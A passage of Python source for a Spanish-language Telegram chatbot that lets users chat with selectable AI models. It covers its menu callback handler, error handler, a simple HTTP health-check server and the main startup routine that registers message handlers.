        await query.edit_message_text(MENSAJE_INICIO, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
        context.user_data['modo_ia'] = False
        return

    if data == "conversar":
        await query.edit_message_text("✏️ *Escríbeme lo que quieras*\n\nPuedes preguntarme cualquier cosa.", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_ia())
        return

    if data == "reset":
        if chat_id in memoria:
            memoria[chat_id]["historial"] = []
        await query.edit_message_text("🧹 *Historial reiniciado.*", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_ia())
        return

    if data == "stats":
        usuario = obtener_usuario_ia(chat_id)
        modelo_actual = usuario["modelo"]
        nombre_modelo = next((m["nombre"] for m in MODELOS.values() if m["id"] == modelo_actual), "Desconocido")
        total_mensajes = len(usuario["historial"]) // 2
        await query.edit_message_text(
            f"📊 *Estadísticas de tu chat*\n\n"
            f"• Modelo actual: *{nombre_modelo}*\n"
            f"• Mensajes intercambiados: *{total_mensajes}*\n"
            f"• Mensajes en memoria: *{len(usuario['historial'])}*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=menu_ia()
        )
        return

    if data == "ayuda":
        await query.edit_message_text(
            "❓ *Ayuda del asistente IA*\n\n"
            "Comandos:\n"
            "• Escribe cualquier mensaje para conversar.\n"
            "• /reset para reiniciar historial.\n"
            "• Cambia de modelo con el botón correspondiente.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=menu_ia()
        )
        return

    if data == "modelos":
        usuario = obtener_usuario_ia(chat_id)
        actual = usuario["modelo"]
        keyboard = []
        for key, mod in MODELOS.items():
            marca = "✅ " if mod["id"] == actual else ""
            keyboard.append([InlineKeyboardButton(f"{marca}{mod['nombre']}", callback_data=f"mod_{key}")])
        keyboard.append([InlineKeyboardButton("🔙 Volver", callback_data="volver_ia")])
        await query.edit_message_text(
            "🤖 *Selecciona un modelo de IA*\n\nEl actual está marcado con ✅.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return

    if data.startswith("mod_"):
        key = data.split("_")[1]
        if key in MODELOS:
            usuario = obtener_usuario_ia(chat_id)
            usuario["modelo"] = MODELOS[key]["id"]
            logger.info(f"✅ Modelo cambiado a: {MODELOS[key]['nombre']}")
            await query.edit_message_text(
                f"✅ *Modelo cambiado a:* {MODELOS[key]['nombre']} ✨\n\n"
                f"Descripción: {MODELOS[key]['desc']}",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=menu_ia()
            )
        else:
            await query.edit_message_text("❌ Modelo no válido.", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_ia())
        return

    if data == "volver_ia":
        await query.edit_message_text(SALUDO_IA, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_ia())
        return

# ========== ERROR HANDLER ==========
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"❌ Error: {context.error}")
    if isinstance(update, Update) and update.effective_message:
        await update.effective_message.reply_text("❌ *Error inesperado.*\nIntenta de nuevo.", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())

# ========== SERVIDOR HTTP ==========
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def run_http_server():
    server = HTTPServer(("0.0.0.0", 8080), HealthHandler)
    server.serve_forever()

# ========== MAIN ==========
def main():
    Thread(target=run_http_server, daemon=True).start()
    logger.info("✅ Servidor HTTP en puerto 8080")
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.VIDEO, handle_video))
    app.add_handler(MessageHandler(filters.AUDIO, handle_audio))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_error_handler(error_handler)
    logger.info("✅ OMNI + IA Fusionado iniciado correctamente")
    app.run_polling()

if __name__ == "__main__":
    main()